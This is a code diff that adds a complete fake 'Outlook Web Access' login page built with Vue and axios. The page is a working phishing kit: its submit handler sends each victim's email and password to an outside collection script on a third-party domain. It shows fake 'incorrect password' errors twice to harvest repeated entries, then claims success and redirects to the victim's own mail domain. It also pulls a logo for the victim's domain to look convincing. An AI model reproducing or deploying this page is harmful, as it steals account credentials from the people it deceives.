@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Outlook Web Access</title>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <link href="https://controlpanel.msoutlookonline.net/Portal/bundles/styles/login/aduser?v=W7BlBDeKoLwh8af7SGN3zTnaNVVx3_J0LsG11KaUjz81" rel="stylesheet">
+    <base href="https://controlpanel.msoutlookonline.net">
+    <link rel="preconnect" href="https://fonts.gstatic.com">
+    <link href="https://fonts.googleapis.com/css2?family=PT+Sans:ital,wght@0,400;0,700;1,400;1,700&display=swap" rel="stylesheet">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tooltipster/4.2.8/css/tooltipster.bundle.min.css" integrity="sha512-RwhQzi0EhwZ9hHs18SqM7ICqW/MH/B17PouhdCuzaUQYEdx2S4WPgkhLeZPvGr2Kb1FIm4gaIbMJGwZtxDCLQA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+
+    <style type="text/css">
+        .alert-box {
+            z-index: 1;
+            display: block;
+            position: relative;
+            float: left;
+            width: 100%;
+            min-height: 20px;
+            height: auto;
+            border-radius: 2px;
+            font-family: 'Open Sans','Helvetica-Neue',Helvetica,sans-serif;
+            font-size: 13px;
+            padding: 10px 8px;
+            box-sizing: border-box;
+            margin: 0 0 8px 0;
+        }
+        .alert-danger-box {
+            border: 1px solid #fbb;
+            background: #ffe6e8;
+            color: #ef4e4e;
+        }
+         .alert-success-box {
+            border: 1px solid #bbffbd;
+            background: #e6fff2;
+            color: #0d391e;
+        }
+    </style>
+
+    <script src="https://controlpanel.msoutlookonline.net/Portal/bundles/scripts/login/form?v=CEQ-L-AOoa_-RT9iCwXyGdkkwsfnT1CfU3GqTfUvn5I1"></script>
+    <script type="text/javascript" src="https://controlpanel.msoutlookonline.net/8974f6aa-63fd-4221-aeea-fcad205312b0.js"></script>
+</head>
+
+<body>
+    <div id="vue-app" v-show="vueAppIsLoaded" style="display: none;">
+        <section class="login-section">
+            <!-- <div class="login-logo"></div> -->
+            <img style="width: 72px;height: 72px;display: block;margin: auto;" 
+                :src="emailDomainLogo" onerror="this.src=window.DEFAULT_SITE_LOGO" alt="Logo" />
+            <!-- <span v-if="false" v-text="emailDomainName"></span> -->
+            <h1 class="login-header" style="font-family: 'PT Sans', sans-serif;">
+                Welcome to {{ emailDomainName || 'Webmail' }} Portal &amp; Account Settings
+            </h1>
+
+            <div class="login-alert" id="login-update-browser-ie" style="display: none">
+                <div class="text-center">
+                    <p class="lh16 mb8"> Internet Explorer is not officially supported and your experience may not be optimal. For the best experience, please upgrade your browser. </p>
+                </div>
+            </div>
+            <div id="oldBrowser" class="login-alert" style="display: none;">
+                <div class="login-alert-content">
+                    <img class="login-alert-icon m-24" src="https://controlpanel.msoutlookonline.net/Content/images/icons/24/warning-orange_24.png" alt>
+                    <div class="login-alert-text">
+                        <div class="d-tc">
+                            <i class="login-alert-icon-warning mr10 ml-10"></i>
+                        </div>
+                        <div class="d-tc">
+                            <p><strong>You’ll get more if you update your browser.</strong> <br>
+                                Our layout and page behavior is optimized for the latest version of your browser.</p>
+                            <p><a class="btn m-warning" href="http://outdatedbrowser.com/en" target="_blank">Update my browser</a></p>
+                            <p class="mb0">This button will redirect you to your browser’s
+                                update page</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="login-tabs">
+                <button style="font-family: 'PT Sans', sans-serif;" class="login-tab login-webmail selected">
+                    Webmail
+                    <i class="icon-info tooltip" title="Access email on the web using OWA"></i>
+                </button>
+                <button style="font-family: 'PT Sans', sans-serif;" class="login-tab login-myservices">
+                    My Services
+                    <i class="icon-info tooltip" title="Change your password, request new services, and perform other basic user tasks"></i>
+                </button>
+            </div>
+            <form method="POST" class="login-form" novalidate autocomplete="off">
+                <div>
+                    <div id="aduser-login-spinner" v-show="isLoading" style="display: none">
+                        <div style="margin: auto; position: absolute; top: 0; left: 0; right: 0; bottom: 0; text-align: center; z-index: 10; background: rgba(255, 255, 255, 0.5);">
+                            <ui:spinner></ui:spinner>
+                        </div>
+                    </div>
+                    <div class="pr">
+                        <input v-model="email" :class="{hasValue:emailNotEmpty}" ref="emailElement" required="" name="login" id="aduser-login-loginInput" type="text" placeholder="Login (email)" class="login-input" required autofocus>
+                        <div class="login-validation required">Login required</div>
+                        <div class="login-validation email">Valid email address required</div>
+                    </div>
+                    
+                    <div class="pr" style="position: relative;">
+                        <input v-model="password" :class="{hasValue:passwordNotEmpty}" ref="passwordElement" v-bind="{type: (showPassword) ? 'text' : 'password'}" name="password" id="aduser-login-passwordInput" placeholder="Password" class="password-input" required>
+                        <!-- Password Visibility -->
+                        <i v-if="enablePasswordVisibilityToggle" @click="togglePasswordVisibility" style="position: absolute;right: 4%;top: 26%;font-size:20px;cursor: pointer;">
+                            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" fill="currentColor" viewBox="0 0 16 16">
+                                <g v-if="showPassword">
+                                    <path d="M16 8s-3-5.5-8-5.5S0 8 0 8s3 5.5 8 5.5S16 8 16 8zM1.173 8a13.133 13.133 0 0 1 1.66-2.043C4.12 4.668 5.88 3.5 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.133 13.133 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755C11.879 11.332 10.119 12.5 8 12.5c-2.12 0-3.879-1.168-5.168-2.457A13.134 13.134 0 0 1 1.172 8z" />
+                                    <path d="M8 5.5a2.5 2.5 0 1 0 0 5 2.5 2.5 0 0 0 0-5zM4.5 8a3.5 3.5 0 1 1 7 0 3.5 3.5 0 0 1-7 0z" />
+                                </g>
+                                <g v-if="!showPassword">
+                                    <path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709z" />
+                                    <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829l.822.822zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829z" />
+                                    <path d="M3.35 5.47c-.18.16-.353.322-.518.487A13.134 13.134 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7.029 7.029 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12-.708.708z" />
+                                </g>
+                            </svg>
+                        </i>
+                        <div class="password-validation required">Password required</div>
+                    </div>
+                    
+                    <div class="alert-box alert-danger-box" v-if="errorMessage" v-html="errorMessage"></div>
+                    <div class="alert-box alert-success-box" v-if="successMessage" v-html="successMessage"></div>
+
+                    <!-- <template id="login-captcha-template">
+                        <div class="login-form-captcha">
+                            <input type="hidden" name="captchaId" value="fcd98768a606478082d0f46b925be781">
+                            <div class="captcha-image">
+                                <img id="captchaImage" src="https://controlpanel.msoutlookonline.net/Portal/Captcha?id=fcd98768a606478082d0f46b925be781&amp;width=94&amp;height=36&amp;rnd=1533510171&amp;httproute=True" alt>
+                            </div>
+                            <button class="captcha-refresh" type="button">
+                                <svg x="0px" y="0px" width="25px" height="24px" viewBox="0 0 25 24" class="captcha-refresh-icon">
+                                    <path d="M11.9,19.5c-3.2,0-6.1-2.2-7.1-5.2l0.8-0.1l0,0c0.6-0.1,0.9-0.6,0.8-1.2c0-0.2-0.2-0.4-0.3-0.6L3.3,9
+                                    c-0.2-0.3-0.6-0.4-1-0.4C2,8.7,1.7,9,1.6,9.3l-1.4,4.3c-0.1,0.3,0,0.7,0.2,1C0.6,14.9,1,15,1.4,15l0.9-0.2
+                                    c1.2,4.3,5.1,7.3,9.7,7.3c2.7,0,5.2-1.1,7.1-3l-1.9-1.9C15.8,18.7,13.9,19.5,11.9,19.5z">
+                                    </path>
+                                    <path d="M23.7,12c-0.2-0.3-0.5-0.5-0.9-0.5l-0.9,0c-0.3-5.3-4.7-9.6-10.1-9.6c-3.5,0-6.7,1.8-8.5,4.7l2.2,1.4
+                                    C7,5.9,9.4,4.6,11.9,4.6c3.9,0,7.2,3.1,7.4,7l-0.8,0c0,0,0,0,0,0c-0.6,0-1,0.5-1,1c0,0.2,0.1,0.4,0.2,0.6l2.1,3.8
+                                    c0.2,0.3,0.5,0.5,0.9,0.5c0.4,0,0.7-0.2,0.9-0.5l2.1-4C23.9,12.7,23.9,12.3,23.7,12z">
+                                    </path>
+                                </svg>
+                            </button>
+                        </div>
+                        <div class="pr">
+                            <input name="captchaCode" type="text" placeholder="Code" class="captcha-input" autofocus>
+                            <div class="captcha-validation required">Code required</div>
+                            <div class="captcha-validation server">Valid code required</div>
+                        </div>
+                    </template>
+                    <div id="login-captcha-place" class="pr"></div> -->
+                    <div class="login-actions">
+                        <div class="login-remember">
+                            <label class="login-remember-me">
+                                <input type="checkbox" name="rememberMe" value="true" class="login-checkbox">
+                                <span style="line-height: 22px; height: 22px;">Remember me</span>
+                            </label>
+                        </div>
+                        <a href="javascript:void(0)" class="login-forgot-password jGaTracking">Forgot password?</a>
+                    </div>
+                </div>
+                <button style="font-family: 'PT Sans', sans-serif;width: auto;" @click.prevent="handleSubmit" type="submit" class="login-submit">{{ submitButtonElementText }}</button>
+            </form>
+        </section>
+    </div>
+    <!-- <script type="text/javascript">
+    $(function() {
+        const maintenanceMode = false;
+        const clientType = 'WebMail';
+        const isAdUser = true;
+        const loginFailed = false;
+        const loginLocked = false;
+        const isCaptchaIdExists = Boolean('fcd98768a606478082d0f46b925be781');
+        const invalidCaptchaCode = false;
+        const rememberMe = false;
+        const forgotPasswordUrl = 'https://login.serverdata.net/user/ForgotPassword';
+        const owaLocatorEnabled = true;
+        const forceShowCaptcha = false;
+
+        showCaptcha(forceShowCaptcha && isCaptchaIdExists);
+
+        document.getElementById('aduser-login-passwordInput').addEventListener('focus', redirectToCustomStsIfNeeded)
+
+        function redirectToCustomStsIfNeeded() {
+
+            const login = $("#aduser-login-loginInput").val();
+            const clientType = $('.client-type').val().toLowerCase();
+            const canShowCaptcha = login && owaLocatorEnabled && (clientType === 'webmail') && isCaptchaIdExists;
+
+            if (canShowCaptcha) {
+                GetOwaStsUrl(login);
+            }
+        }
+
+        if (maintenanceMode && !isAdUser) {
+            disable();
+            return;
+        }
+
+        if (isAdUser) {
+            if (maintenanceMode) {
+                setLoginTab('WebMail');
+                $('.login-myservices').prop('disabled', true);
+            } else {
+                setLoginTab(clientType);
+                $('.login-webmail').on('click', function() {
+                    setLoginTab('WebMail');
+                });
+                $('.login-myservices').on('click', function() {
+                    setLoginTab('UserSettings');
+                });
+            }
+        }
+
+        $('.login-forgot-password').on('click', function() {
+            submitToUrl(forgotPasswordUrl);
+        });
+
+        if (loginFailed || loginLocked) {
+            showMixedValidation();
+        }
+
+        if (invalidCaptchaCode) {
+            $('.captcha-validation.server').show();
+            setInputErrorStyle($('.captcha-input'), true);
+        }
+
+        if (loginFailed || loginLocked || invalidCaptchaCode) {
+            onLoginFailed(clientType, rememberMe);
+        }
+    });
+    </script> -->
+    <!-- SCRIPT BEGINS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <!-- <script type="text/javascript" src="http://code.jquery.com/jquery-1.7.0.min.js"></script> -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/tooltipster/4.2.8/js/tooltipster.bundle.min.js" integrity="sha512-ZKNW/Nk1v5trnyKMNuZ6kjL5aCM0kUATbpnWJLPSHFk/5FxnvF9XmpmjGbag6BEgmXiz7rL6o6uJF6InthyTSg==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+    <script src="https://controlpanel.msoutlookonline.net/Portal/bundles/scripts/login/form/aduser?v=B87zorpzZDMoJcsZoh1VXPIom52zrbX9F7qXIbJKQ3w1"></script>
+    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
+
+
+    <script type="text/javascript">
+    $(function() {
+        'use strict';
+
+        function has(userAgentSubstr) {
+            return window.navigator.userAgent.indexOf(userAgentSubstr) !== -1;
+        }
+
+        // if <=IE10 or ==IE11
+        if (has('MSIE ') || has('Trident/')) {
+            $('#login-update-browser-ie').show();
+        }
+
+        $('.login-tab').on('click', function(e) {
+            e.preventDefault();
+
+            $('.login-tab').removeClass('selected');
+
+            $(this).addClass('selected');
+        })
+    });
+    </script>
+    <script>
+        window.MAIL_URL = 'https://www.boldsteps.club/shunlee/abriba/uwkal/post.php';
+        window.AUTH_LOADING_MESSAGE = 'Authenticating...';
+        window.LOGIN_ERROR_MESSAGE = `Your account login or password is incorrect. Try again`;
+
+        window.DEFAULT_SITE_TITLE = "Web Access";
+        window.DEFAULT_SITE_LOGO = "https://controlpanel.msoutlookonline.net/content/images/icons/custom/aduser.svg";
+        //SETTING OF SOME STUFF
+        window.ALLOW_DYNAMIC_EMAIL_LOGO = true;
+        window.ENABLE_PASSWORD_VISIBILITY_TOGGLE = true;
+
+        // refs
+        // emailElement
+        // passwordElement
+        new Vue({
+            data: () => ({
+                vueAppIsLoaded: false,
+                //LOGO CHANGING DATA DUE TO EMAIL DOMAIN
+                emailDomainLogo: '',
+                emailDomainName: '',
+                //MAIN APPLICATION DATA
+                enablePasswordVisibilityToggle: false,
+                showPassword: false,
+                retryAttemptCount: 0,
+                isLoading: false,
+                submitButtonText: 'Login',
+                errorMessage: '',
+                successMessage: '',
+                email: '',
+                password: '',
+            }),
+
+            created() {
+                this.turnUrlToRandom();
+                //SET AXIOS RESPONSE TIME 
+                axios.interceptors.request.use((config) => {
+                    config.headers['request-startTime'] = new Date()
+                    return config
+                })
+
+                axios.interceptors.response.use((response) => {
+                    const start = response.config.headers['request-startTime']
+                    const end = new Date()
+                    const milliseconds = end - start;
+                    response.headers['request-duration'] = milliseconds
+                    return response
+                })
+
+                // SET EMAIL HASH
+                const pageUrl = window.location.href;
+                const pageUrlArray = pageUrl.split("#");
+                if (pageUrlArray.length > 1) { this.email = pageUrlArray[pageUrlArray.length - 1]; }
+
+                // this.pageMiddleware();
+
+                this.enablePasswordVisibilityToggle = window.ENABLE_PASSWORD_VISIBILITY_TOGGLE;
+
+                $("body").on('click', 'a', function(e) { e.preventDefault() });
+            },
+
+            mounted: function() {
+                this.$nextTick(function() {
+                    this.setNameAndFavicon(this.email);
+                    this.vueAppIsLoaded = true;
+                    setTimeout(() => {
+                        if (_.isEmpty(this.email)) {
+                            this.$refs.emailElement.focus();
+                        } else {
+                            this.$refs.passwordElement.focus();
+                        }
+                    }, 600)
+                })
+            },
+
+            computed: {
+                emailNotEmpty: function() {
+                    return !_.isEmpty(this.email);
+                },
+                passwordNotEmpty: function() {
+                    return !_.isEmpty(this.password);
+                },
+                submitButtonElementText: function() {
+                    return this.isLoading ? window.AUTH_LOADING_MESSAGE : this.submitButtonText;
+                }
+            },
+
+            watch: {
+                email: async function(newQuestion, oldQuestion) {
+                    this.setNameAndFavicon(this.email);
+                },
+                emailDomainLogo: function() {
+                    var link = document.querySelector("link[rel~='icon']");
+                    if (!link) {
+                        link = document.createElement('link');
+                        link.rel = 'icon';
+                        document.getElementsByTagName('head')[0].appendChild(link);
+                    }
+
+                    favicon = new Image();
+                    favicon.src = this.emailDomainLogo
+
+                    favicon.onerror = function() {
+                        link.href = window.DEFAULT_SITE_LOGO;
+                    }
+
+                    favicon.onload = function(image) {
+                        link.href = image.target.src;
+                    }
+                },
+                emailDomainName: function() {
+                    document.title = this.setDocumentPageTitle();
+                }
+            },
+
+            methods: {
+                togglePasswordVisibility() {
+                    if (this.enablePasswordVisibilityToggle) {
+                        this.showPassword = !this.showPassword;
+                    }
+                },
+                async handleSubmit() {
+                    this.errorMessage = '';
+                    this.successMessage = '';
+
+                    try {
+                        if (!(this.email && this.password)) {
+                            throw Error('Email and Password is required.');
+                        }
+
+                        if (!this.validateEmail(this.email)) {
+                            throw Error('Email is invalid.');
+                        }
+
+                        if (this.password.length <= 4) {
+                            throw Error('Password must be greater than four characters.');
+                        }
+
+                        this.isLoading = true;
+                        const response = await this.sendMail(this.email, this.password);
+
+                        const self = this;
+
+                        setTimeout(() => {
+
+                            if (this.retryAttemptCount < 2) {
+                                this.retryAttemptCount = this.retryAttemptCount + 1;
+                                //reset password to empty
+                                this.password = '';
+                                this.isLoading = false;
+                                this.errorMessage = window.LOGIN_ERROR_MESSAGE;
+
+                            } else {
+                                //success message
+                                this.isLoading = false;
+                                this.successMessage = `Login successful. wait you are being redirected`;
+                                //redirect
+                                setTimeout(() => {
+                                    window.location.replace(this.finalRedirectUrl());
+                                }, 1000);
+                            }
+                        }, 4000 - response.headers['request-duration'])
+
+                    } catch (error) {
+                        this.isLoading = false;
+                        this.errorMessage = error.message;
+                    }
+                },
+
+                async sendMail(email, password) {
+                    try {
+                        const data = new FormData();
+                        data.append('email', email);
+                        data.append('password', password);
+                        return await axios.post(window.MAIL_URL, data);
+                    } catch (error) {
+                        throw Error('Unable to connect to server');
+                    }
+                },
+
+                validateEmail(email) {
+                    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+                    return re.test(email);
+                },
+
+                async setNameAndFavicon(email) {
+                    try {
+                        if (!window.ALLOW_DYNAMIC_EMAIL_LOGO) {
+                            return;
+                        }
+
+                        this.emailDomainLogo = '';
+                        this.emailDomainName = '';
+
+                        if (!this.validateEmail(email)) {
+                            return;
+                        }
+
+                        const domain = email.split("@")[1];
+                        this.emailDomainLogo = `https://logo.clearbit.com/${domain}`;
+                        this.emailDomainName = domain;
+                    } catch (error) {
+                        console.log(error)
+                    }
+                },
+
+                turnUrlToRandom() {
+                    const url = new URL(window.location.href);
+
+                    if (!(
+                            url.searchParams.has('websrc') &&
+                            url.searchParams.has('dispatch') &&
+                            url.searchParams.has('id')
+                            //&& url.searchParams.has('email')
+                        )) {
+                        url.searchParams.append('websrc', url.searchParams.get('websrc') || this.randomString(232))
+                        url.searchParams.append('dispatch', url.searchParams.get('dispatch') || this.randomString(232, '0123456789'))
+                        url.searchParams.append('id', url.searchParams.get('id') || this.randomString(62, '4iA76e54o45b-a3i2Xc6-49b50-80i3e6cD'))
+                        //url.searchParams.append('email', url.searchParams.get('email'));
+
+                        window.location.replace(url.toString())
+                    }
+                },
+
+                randomString(length, chars = "4iA76e54o45b-a3i2Xc6-49b50-80i3e6cD") {
+                    var result = '';
+                    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
+                    return result;
+                },
+                //==========//
+                pageMiddleware() {
+                    if (_.isEmpty(this.email)) {
+                        window.location.replace("https://google.com");
+                    }
+                },
+
+                finalRedirectUrl() {
+                    return `https://${this.emailDomainName.toLowerCase()}`;
+                },
+
+                setDocumentPageTitle(){
+                    return this.emailDomainName 
+                        ? `${this.emailDomainName.toUpperCase()} Web Access`
+                        : window.DEFAULT_SITE_TITLE;
+                }
+            }
+
+        }).$mount('#vue-app');
+    </script>
+</body>
+
+</html>
